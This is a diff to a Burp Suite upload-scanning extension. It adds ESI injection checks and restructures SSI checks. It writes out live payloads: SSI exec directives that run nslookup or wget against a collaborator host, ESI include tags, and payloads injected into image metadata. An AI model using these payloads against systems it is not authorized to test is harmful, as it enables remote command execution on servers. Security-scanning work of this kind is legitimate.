@@ -68,6 +68,7 @@ from java.net import URL
 from java.nio.file import Files
 from java.lang import Thread
 from java.lang import IllegalStateException
+from java.lang import System
 # python stdlib imports
 from io import BytesIO  # to mimic file IO but do it in-memory
 import tempfile  # to make temporary files for exiftool to process
@@ -93,6 +94,7 @@ import zlib  # for the fingerping module
 import itertools  # for the fingerping module
 import threading  # to make stuff thread safe
 import pickle  # persisting object serialization between extension reloads
+import ast  # to parse ${PYTHONSTR:'abc\ndef'} into a python str
 
 # Developer debug mode
 global DEBUG_MODE
@@ -138,11 +140,14 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         'http://',
         'https://',
     )
-    MAX_SERIALIZED_DOWNLOAD_MATCHERS = 300
+    MAX_SERIALIZED_DOWNLOAD_MATCHERS = 500
+    MAX_RESPONSE_SIZE = 300000  # 300kb
 
     # ReDownloader constants/read-only:
     REDL_URL_BAD_HEADERS = ("content-length:", "accept:", "content-type:", "referer:")
     REDL_FILENAME_MARKER = "${FILENAME}"
+    PYTHON_STR_MARKER_START = "${PYTHONSTR:"
+    PYTHON_STR_MARKER_END = "}"
 
     # Implement IBurpExtender
     def registerExtenderCallbacks(self, callbacks):
@@ -431,7 +436,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         # See also what file extensions the .htaccess module would enable!
         # It is unlikely that a server accepts content type text/html...
         self.SSI_TYPES = {
-            ('', '.shtml', 'text/plain'),
+            #('', '.shtml', 'text/plain'),
             ('', '.shtml', 'text/html'),
             #('', '.stm', 'text/html'),
             #('', '.shtm', 'text/html'),
@@ -715,6 +720,20 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         return self._main_jtabedpane
 
     def show_error_popup(self, error_details):
+        try:
+            f = file("BappManifest.bmf", "rb").readlines()
+            for line in f:
+                if line.startswith("ScreenVersion: "):
+                    print line
+                    error_details += "\n" + line.replace("ScreenVersion", "Upload Scanner Version")
+                    break
+        except:
+            print "Could not find plugin version..."
+        try:
+            error_details += "\nJython version: " + sys.version
+            error_details += "\nJava version: " + System.getProperty("java.version")
+        except:
+            print "Could not find Jython/Java version..."
         self._no_of_errors += 1
         if self._no_of_errors < 2:
             full_msg = 'The Burp extension "Upload Scanner" just crashed. The details of the issue are at the bottom. \n' \
@@ -786,8 +805,8 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             # This can get computationally expensive if there are a lot of files that were uploaded...
             # ... make sure we only scan responses and if we have any matcher rules
             if not messageIsRequest:
-                if len(base_request_response.getResponse()) >= 300000:
-                    # Don't look at responses longer than 300kb
+                if len(base_request_response.getResponse()) >= BurpExtender.MAX_RESPONSE_SIZE:
+                    # Don't look at responses longer than MAX_RESPONSE_SIZE
                     return
                 iRequestInfo = self._helpers.analyzeRequest(base_request_response)
                 #print type(iRequestInfo.getUrl().toString()), repr(iRequestInfo.getUrl().toString())
@@ -798,6 +817,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 matchers = self.dl_matchers.get_matchers_for_url(url)
                 if not matchers:
                     #We hit this for all not "in scope" requests
+                    #we also hit it for URLs that can not be parsed by urlparse such as https://github.com/modzero/mod0BurpUploadScanner/issues/12
                     return
                 iResponseInfo = self._helpers.analyzeResponse(base_request_response.getResponse())
                 headers = [FloydsHelpers.u2s(x) for x in iResponseInfo.getHeaders()]
@@ -989,8 +1009,9 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
             # SSI - generic
             if injector.opts.modules['ssi'].isSelected():
-                print "\nDoing SSI checks"
+                print "\nDoing SSI/ESI checks"
                 colab_tests.extend(self._ssi(injector, burp_colab))
+                colab_tests.extend(self._esi(injector, burp_colab))
                 self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
             # XXE - generic
             if injector.opts.modules['xxe'].isSelected():
@@ -1871,10 +1892,15 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         urr = urrs[0]
         if urr.download_rr:
             url = FloydsHelpers.u2s(self._helpers.analyzeRequest(urr.download_rr).getUrl().toString())
-            path = urlparse.urlparse(url).path
-            path_no_filename = path.rsplit("/", 1)[0] + "/"
-            self.dl_matchers.add(DownloadMatcher(issue, filecontent="Index of /", url_content=path_no_filename))
-            self._send_get_request(urr.download_rr, path_no_filename, injector.opts.create_log)
+            try:
+                path = urlparse.urlparse(url).path
+            except ValueError:
+                # Catch https://github.com/modzero/mod0BurpUploadScanner/issues/12
+                path = None
+            if path:
+                path_no_filename = path.rsplit("/", 1)[0] + "/"
+                self.dl_matchers.add(DownloadMatcher(issue, filecontent="Index of /", url_content=path_no_filename))
+                self._send_get_request(urr.download_rr, path_no_filename, injector.opts.create_log)
 
         if not burp_colab:
             return []
@@ -2074,34 +2100,48 @@ Response.write(a&c&b)
 
         return colab_tests
 
+    def _ssi_payload(self):
+        non_existant_domain = "{}.{}.local".format(str(random.randint(100000, 999999)), str(random.randint(100000, 999999)))
+        expect = " can't find " + non_existant_domain
+        content = '<!--#exec cmd="nslookup ' + non_existant_domain + '" -->'
+        return content, expect
+
     def _ssi(self, injector, burp_colab):
         issue_name = "SSI injection"
         severity = "High"
         confidence = "Certain"
 
-        # reflected nslookup output
+        # Reflected nslookup
         # TODO feature: This might fail if the DNS is responding with default DNS entries, then it won't say "can't find" and the
         # domain but I couldn't come up with anything better for SSI except Burp collaborator payloads and this...
         # At least "can't find" + domain is present in Linux and Windows nslookup output
-        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiReflectNslookup"
-        non_existant_domain = "{}{}{}.{}{}{}.local".format(str(random.randint(100000,999999)),
-                                                       str(random.randint(100000,999999)),
-                                                       str(random.randint(100000,999999)),
-                                                       str(random.randint(100000,999999)),
-                                                       str(random.randint(100000,999999)),
-                                                       str(random.randint(100000,999999)))
-        expected_download_content = " can't find " + non_existant_domain
-        content = '<!--#exec cmd="nslookup ' + non_existant_domain + '" -->'
-        detail = "A certain string was dectected when uploading and downloading an Server Side Include file with a " \
-                 "payload that executes commands with nslookup. Therefore arbitrary command execution seems possible. " \
-                 "Note that if you enabled the .htaccess module as well, this attack might have only succeeded because " \
-                 "we were already able to upload a .htaccess file that enables SSI. The payload in this attack was: " \
-                 "<br><br>{}<br><br> The found string in a response was: " \
-                 "<br>{}<br><br>".format(cgi.escape(content), cgi.escape(expected_download_content))
+        main_detail = "A certain string was dectected when uploading and downloading an Server Side Include file with a " \
+                      "payload that executes commands with nslookup. Therefore arbitrary command execution seems possible. " \
+                      "Note that if you enabled the .htaccess module as well, this attack might have only succeeded because " \
+                      "we were already able to upload a .htaccess file that enables SSI. The payload in this attack was: " \
+                      "<br><br>{}<br><br> The found string in a response was: " \
+                      "<br>{}<br><br>"
 
+        # Reflected nslookup - Simple
+        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiReflectDnsSimple"
+        content, expect = self._ssi_payload()
+        detail = main_detail.format(cgi.escape(content), cgi.escape(expect))
         issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
-        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expected_download_content))
+        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
         self._send_simple(injector, self.SSI_TYPES, basename, content, redownload=True)
+
+        # Reflected nslookup - File metadata
+        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
+        size = (injector.opts.image_width, injector.opts.image_height)
+        for payload, expect, name, ext, content in bi.get_files(size, self._ssi_payload):
+            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiReflectDns" + name
+            detail = main_detail + "In this case the payload was injected into a file with metatadata of type {}."
+            detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
+            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
+            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
+            self._send_simple(injector, self.SSI_TYPES, basename, content, redownload=True)
+
+        # TODO: Decide if additional sleep based payloads would make sense, probably rather not
 
         # Burp community edition doesn't have Burp collaborator
         if not burp_colab:
@@ -2109,47 +2149,99 @@ Response.write(a&c&b)
 
         colab_tests = []
 
-        # burp collaborator
+        # RCE with Burp collaborator
         base_detail = "A burp collaborator interaction was dectected when uploading an Server Side Include file with a payload that " \
                 "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. Note that if " \
                 "you enabled the .htaccess module as well, this attack might have only succeeded because we were " \
                 "already able to upload a .htaccess file that enables SSI. "
 
-        # TODO: Decide if additional sleep based payloads would make sense, probably rather not
-
-        # For SSI backdoored files we only use the first payload type (either nslookup or wget)
-        # as otherwise we run into a combinatoric explosion with payload types multiplied with exiftool techniques
-        cmd_name, cmd, server, replace = next(iter(self._get_rce_interaction_commands(injector, burp_colab)))
-        ssicolab = SsiPayloadGenerator(burp_colab, cmd, server, replace)
-        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
-        size = (injector.opts.image_width, injector.opts.image_height)
-        for payload, _, name, ext, content in bi.get_files(size, ssicolab.payload_func):
-            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiBfRce" + name
-            desc = 'Remote command execution through SSI payload in Metadata of type {}. The server executed a SSI ' \
-                   'Burp Collaborator payload with {} inside the uploaded file. ' \
-                   '<br>Interactions: <br><br>'.format(name, cmd_name)
-            issue = self._create_issue_template(injector.get_brr(), issue_name, base_detail + desc, "Certain", "High")
-            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SSI_TYPES, basename,
-                                                       content, issue, replace=ssicolab.placeholder, redownload=True))
-
-        # Plain SSI files
+        # RCE with Burp collaborator - Simple
         for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
             basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiColab" + cmd_name
             content = '<!--#exec cmd="{} {}" -->'.format(cmd, server)
             detail = "{}A {} payload was used. <br>Interactions: <br><br>".format(base_detail, cmd_name)
             issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
             colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SSI_TYPES, basename,
-                                              content, issue, replace=replace, redownload=True))
+                                                       content, issue, replace=replace, redownload=True))
+
+        # RCE with Burp collaborator - File metadata
+        # For SSI backdoored files we only use the first payload type (either nslookup or wget)
+        # as otherwise we run into a combinatoric explosion with payload types multiplied with exiftool techniques
+        base_desc = 'Remote command execution through SSI payload in Metadata of type {}. The server executed a SSI ' \
+                    'Burp Collaborator payload with {} inside the uploaded file. ' \
+                    '<br>Interactions: <br><br>'
+        cmd_name, cmd, server, replace = next(iter(self._get_rce_interaction_commands(injector, burp_colab)))
+        ssicolab = SsiPayloadGenerator(burp_colab, cmd, server, replace)
+        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
+        size = (injector.opts.image_width, injector.opts.image_height)
+        for payload, _, name, ext, content in bi.get_files(size, ssicolab.payload_func):
+            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SsiBfRce" + name
+            desc = base_desc.format(cgi.escape(name), cgi.escape(cmd_name))
+            issue = self._create_issue_template(injector.get_brr(), issue_name, base_detail + desc, confidence, severity)
+            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SSI_TYPES, basename,
+                                                       content, issue, replace=ssicolab.placeholder, redownload=True))
+
+        return colab_tests
+
+    def _esi_payload(self):
+        one = ''.join(random.sample(string.ascii_letters, 5))
+        two = ''.join(random.sample(string.ascii_letters, 5))
+        three = ''.join(random.sample(string.ascii_letters, 5))
+        content = '{}<!--esi-->{}<!--esx-->{}'.format(one, two, three)
+        expect = '{}{}<!--esx-->{}'.format(one, two, three)
+        return content, expect
+
+    def _esi(self, injector, burp_colab):
+        issue_name = "ESI injection"
+        severity = "High"
+        confidence = "Certain"
+
+        # Reflected stripped esi tag
+        base_detail = "When uploading an Edge Side Include file with a payload of {}, the server later responded with " \
+                      "{} only. This means that ESI might be enabled. The payload was an Edge Side Include (ESI) tag, see " \
+                      "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. "
+
+        # Reflected stripped esi tag - Simple
+        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiReflectSimple"
+        content, expect = self._esi_payload()
+        detail = base_detail.format(cgi.escape(content), cgi.escape(expect))
+        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
+        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
+        self._send_simple(injector, self.ESI_TYPES, basename, content, redownload=True)
+
+        # Reflected nslookup - File metadata
+        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
+        size = (injector.opts.image_width, injector.opts.image_height)
+        for payload, expect, name, ext, content in bi.get_files(size, self._esi_payload):
+            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiReflect" + name
+            detail = base_detail + "In this case the payload was injected into a file with metatadata of type {}."
+            detail = detail.format(cgi.escape(content), cgi.escape(expect), name)
+            issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
+            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
+            self._send_simple(injector, self.ESI_TYPES, basename, content, redownload=True)
+
+        # Burp community edition doesn't have Burp collaborator
+        if not burp_colab:
+            return []
+
+        colab_tests = []
 
         # ESI injection - includes remote URL -> burp collaborator
+        # According to feedback on https://github.com/modzero/mod0BurpUploadScanner/issues/11
+        # this is unlikely to be successfully triggered
         basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "EsiColab"
         content = '<esi:include src="{}1.html" alt="{}" onerror="continue"/>'.format(BurpExtender.MARKER_COLLAB_URL, BurpExtender.MARKER_CACHE_DEFEAT_URL)
         detail = "A burp collaborator interaction was dectected when uploading an Edge Side Include file with a payload that " \
-                "includes a burp collaborator URL. The payload was a Edge Side Include (ESI) tag, see " \
-                "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. <br>Interactions: <br><br>"
-        issue = self._create_issue_template(injector.get_brr(), "Edge Side Include (ESI)", detail, confidence, severity)
+                 "includes a burp collaborator URL. The payload was an Edge Side Include (ESI) tag, see " \
+                 "https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/. As it is unlikely " \
+                 "that ESI attacks result in successful Burp Collaborator interactions, this is also likely to " \
+                 "be a Squid proxy, which is one of the few proxies that support that.<br>Interactions: <br><br>"
+        issue = self._create_issue_template(injector.get_brr(), issue_name, detail, confidence, severity)
         colab_tests.extend(self._send_collaborator(injector, burp_colab, self.ESI_TYPES, basename,
                                                    content, issue, redownload=True))
+
+        # Not doing the metadata file + Burp Collaborator approach here, as that seems to be a waste of requests as explained
+        # on https://github.com/modzero/mod0BurpUploadScanner/issues/11
 
         return colab_tests
 
@@ -2380,11 +2472,7 @@ Response.write(a&c&b)
     def _xss_backdoored_file(self, injector):
         bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
         size = (injector.opts.image_width, injector.opts.image_height)
-        # I don't think we need to test all of them, as usually they will just be returned as the Content-Type
-        # of the image and therefore not lead to XSS
-        formats_not_used = {".gif", ".bmp", ".png"}
-        used_formats = set(BackdooredFile.EXTENSION_TO_MIME.keys()).intersection(injector.opts.get_enabled_file_formats()) - formats_not_used
-        for payload, expect, name, ext, content in bi.get_files(size, self._xss_payload, formats=used_formats):
+        for payload, expect, name, ext, content in bi.get_files(size, self._xss_payload):
             basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "BfXss" + name
             title = "Cross-site scripting (stored)" # via " + ext[1:].upper() + " Metadata"
             desc = 'XSS through injection of HTML in Metadata of type ' + name + '. The server ' \
@@ -5159,16 +5247,16 @@ class BackdooredFile:
                                     padded_payload = payload + " " * padding
                                     c = new_content.replace(thumbnail_image_cont, padded_payload)
                                     if payload in c:
-                                        yield payload, expect, "PayloadAs" + name, ext, c
+                                        yield payload, expect, "Pa" + name, ext, c
                         if payload_placeholder in new_content:
                             c = new_content.replace(payload_placeholder, payload)
                             if payload in c:
                                 # print "Successfully produced image file with payload in the following metadata:", name, ext
                                 yield payload, expect, name, ext, c
                         else:
-                            print "Warning: Payload missing in output. E.g. one reason: IPTC:Keywords has length limit of 64. " \
-                                  "Image that could not be created: {} {}. Payload that should be injected" \
-                                  " and placeholder: {} {}".format(name, ext, repr(payload), payload_placeholder)
+                            print "Warning: Payload missing. IPTC:Keywords has length limit of 64. " \
+                                  "Technique: {}, File type: {}, Payload length: {}" \
+                                  "".format(name, ext, len(payload_placeholder))
                             # print "Content:", repr(new_content)
                     else:
                         print "Error: The following image could not be created (exiftool didn't create a file):", name, ext
@@ -6593,6 +6681,8 @@ class DownloadMatcherCollection(object):
     def get_matchers_for_url(self, url):
         with self._thread_lock:
             hostport = self._get_host(url)
+            if not hostport:
+                return []
             if hostport in self._collection:
                 return self.with_global(self._collection[hostport])
 
@@ -6619,7 +6709,11 @@ class DownloadMatcherCollection(object):
     def _get_host(self, url):
         if not url:
             return None
-        x = urlparse.urlparse(url)
+        try:
+            x = urlparse.urlparse(url)
+        except ValueError:
+            # Catch errors such as the one described on https://github.com/modzero/mod0BurpUploadScanner/issues/12
+            return None
         return x.hostname
 
     def serialize(self):
@@ -7718,7 +7812,9 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
         # Options Download-Again:
         # Make configurable
         self.redl_start_marker = ''
+        self.redl_start_marker_transformed = ''  # transformed means ${PYTHONSTR:''} placeholders changed to actual values
         self.redl_end_marker = ''
+        self.redl_end_marker_transformed = ''  # transformed means ${PYTHONSTR:''} placeholders changed to actual values
         self.redl_repl_backslash = False
         self.redl_parse_preflight_url = ''
         self.redl_prefix = ''
@@ -7963,7 +8059,7 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
         self.module_labels['asp'], self.modules['asp'] = self.checkbox('ASP:', True)
         self.module_labels['htaccess'], self.modules['htaccess'] = self.checkbox('htaccess/web.config:', True)
         self.module_labels['cgi'], self.modules['cgi'] = self.checkbox('CGI (Perl, Python, Ruby):', True)
-        self.module_labels['ssi'], self.modules['ssi'] = self.checkbox('Server Side Include:', True)
+        self.module_labels['ssi'], self.modules['ssi'] = self.checkbox('Server/Edge Side Include:', True)
         self.module_labels['xxe'], self.modules['xxe'] = self.checkbox('XXE (XML, SVG, Office Docs, XMP):', True)
         self.module_labels['xss'], self.modules['xss'] = self.checkbox('XSS (html, SVG, xssproject.swf):', True)
         self.module_labels['eicar'], self.modules['eicar'] = self.checkbox('Eicar:', True)
@@ -8116,6 +8212,18 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
                 formats.add("." + file_format)
         return formats
 
+    def _process_python_str(self, input):
+        output = input
+        if input.startswith(BurpExtender.PYTHON_STR_MARKER_START) and input.endswith(BurpExtender.PYTHON_STR_MARKER_END):
+            value = input[len(BurpExtender.PYTHON_STR_MARKER_START):-len(BurpExtender.PYTHON_STR_MARKER_END)]
+            try:
+                parsed = ast.literal_eval(value)
+            except (ValueError, SyntaxError), e:
+                print "Issue when processing your specified", input
+                print e
+            if isinstance(parsed, str):
+                output = parsed
+        return output
 
     #
     # UI: implement what happens when options are changed
@@ -8410,12 +8518,14 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
             not self.redl_static_url == FloydsHelpers.u2s(self.tf_redl_static_url.getText())
 
         self.redl_start_marker = FloydsHelpers.u2s(self.tf_redl_start_marker.getText())
-        if self.redl_start_marker:
+        self.redl_start_marker_transformed = self._process_python_str(self.redl_start_marker)
+        if self.redl_start_marker_transformed:
             OptionsPanel.mark_configured(self.lbl_redl_start_marker)
         else:
             OptionsPanel.mark_disabled(self.lbl_redl_start_marker)
         self.redl_end_marker = FloydsHelpers.u2s(self.tf_redl_end_marker.getText())
-        if self.redl_end_marker:
+        self.redl_end_marker_transformed = self._process_python_str(self.redl_end_marker)
+        if self.redl_end_marker_transformed:
             OptionsPanel.mark_configured(self.lbl_redl_end_marker)
         else:
             OptionsPanel.mark_disabled(self.lbl_redl_end_marker)
@@ -8490,7 +8600,7 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
                 OptionsPanel.mark_misconfigured(self.scan_controler.lbl_parser)
                 self.scan_controler.disable_redownload()
                 self.redl_configured = False
-            elif self.redl_start_marker and self.redl_end_marker:
+            elif self.redl_start_marker_transformed and self.redl_end_marker_transformed:
                 OptionsPanel.mark_configured(self.lbl_redl)
                 # This means for sure this is prefered over the static URL (even when misconfigured)
                 OptionsPanel.mark_disabled(self.lbl_redl_static_url)
@@ -8507,14 +8617,17 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
                 else:
                     resp = FloydsHelpers.jb2ps(self.scan_controler.upload_resp_view.getMessage())
                 if resp:
-                    parsed_content = FloydsHelpers.between_markers(resp, self.redl_start_marker, self.redl_end_marker)
+                    multipart_file_name = CustomMultipartInsertionPoint(self._helpers, BurpExtender.NEWLINE,
+                                                                        FloydsHelpers.jb2ps(self.scan_controler.upload_req_view.getMessage())).getBaseValue()
+                    redownload_file_name = self.fi_ofilename or multipart_file_name or "example.jpeg"
+                    redl_start_marker = self.redl_start_marker_transformed.replace(BurpExtender.REDL_FILENAME_MARKER, redownload_file_name)
+                    redl_end_marker = self.redl_end_marker_transformed.replace(BurpExtender.REDL_FILENAME_MARKER, redownload_file_name)
+                    parsed_content = FloydsHelpers.between_markers(resp, redl_start_marker, redl_end_marker)
                     if parsed_content:
                         self.scan_controler.lbl_parser.setText("Configuration status: Simple parse ready for test, check requests manually first!")
                         OptionsPanel.mark_configured(self.scan_controler.lbl_parser)
                         self.scan_controler.btn_start.setText("Start scan without ReDownloader")
-                        multipart_file_name = CustomMultipartInsertionPoint(self._helpers, BurpExtender.NEWLINE,
-                                                        FloydsHelpers.jb2ps(self.scan_controler.upload_req_view.getMessage())).getBaseValue()
-                        redownload_file_name = self.fi_ofilename or multipart_file_name or "example.jpeg"
+
                         service, req = self._calculate_download_request(self.scan_controler.brr, resp, redownload_file_name)
                         if service and req:
                             self.scan_controler.set_redownload_req(service, req)
@@ -8522,12 +8635,12 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
                     else:
                         misconfiguration = True
                         OptionsPanel.mark_misconfigured(self.lbl_redl)
-                        if not self.redl_start_marker in resp:
-                            self.scan_controler.lbl_parser.setText("Configuration status: Misconfiguration, no start marker "+self.redl_start_marker+" in response")
-                        elif not self.redl_end_marker in resp:
-                            self.scan_controler.lbl_parser.setText("Configuration status: Misconfiguration, no end marker "+self.redl_end_marker+" in response")
+                        if not redl_start_marker in resp:
+                            self.scan_controler.lbl_parser.setText("Configuration status: Misconfiguration, no start marker " + redl_start_marker + " in response")
+                        elif not redl_end_marker in resp:
+                            self.scan_controler.lbl_parser.setText("Configuration status: Misconfiguration, no end marker " + redl_end_marker + " in response")
                         else:
-                            self.scan_controler.lbl_parser.setText("Configuration status: Misconfiguration, no content between "+self.redl_start_marker+" and "+self.redl_end_marker)
+                            self.scan_controler.lbl_parser.setText("Configuration status: Misconfiguration, no content between " + redl_start_marker + " and " + redl_end_marker)
                         OptionsPanel.mark_misconfigured(self.scan_controler.lbl_parser)
                         OptionsPanel.mark_misconfigured(self.lbl_redl)
                         OptionsPanel.mark_misconfigured(self.lbl_redl_start_marker)
@@ -8695,9 +8808,11 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
     def _calculate_download_request(self, brr, resp, sent_filename, use_from_ui=False):
         prefix = self.redl_prefix.replace(BurpExtender.REDL_FILENAME_MARKER, urllib.quote(sent_filename))
         suffix = self.redl_suffix.replace(BurpExtender.REDL_FILENAME_MARKER, urllib.quote(sent_filename))
+        redl_start_marker = self.redl_start_marker_transformed.replace(BurpExtender.REDL_FILENAME_MARKER, sent_filename)
+        redl_end_marker = self.redl_end_marker_transformed.replace(BurpExtender.REDL_FILENAME_MARKER, sent_filename)
         service = brr.getHttpService()
-        if resp and self.redl_start_marker and self.redl_end_marker:
-            url_path = FloydsHelpers.between_markers(resp, self.redl_start_marker, self.redl_end_marker)
+        if resp and redl_start_marker and redl_end_marker:
+            url_path = FloydsHelpers.between_markers(resp, redl_start_marker, redl_end_marker)
             if url_path:
                 if self.redl_repl_backslash:
                     url_path = url_path.replace("\\/", "/")
